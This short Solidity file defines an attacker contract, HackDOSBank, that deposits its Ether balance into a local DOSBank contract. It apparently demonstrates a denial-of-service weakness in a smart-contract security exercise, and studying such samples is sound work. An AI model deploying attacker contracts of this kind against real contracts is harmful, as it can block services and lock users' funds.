// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
import "hardhat/console.sol";

import "./DOSBank.sol";

contract HackDOSBank {
    DOSBank dosBank;

    constructor(address payable _bankAddress) payable {
        dosBank = DOSBank(_bankAddress);
    }

    function deposit() external {
        dosBank.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
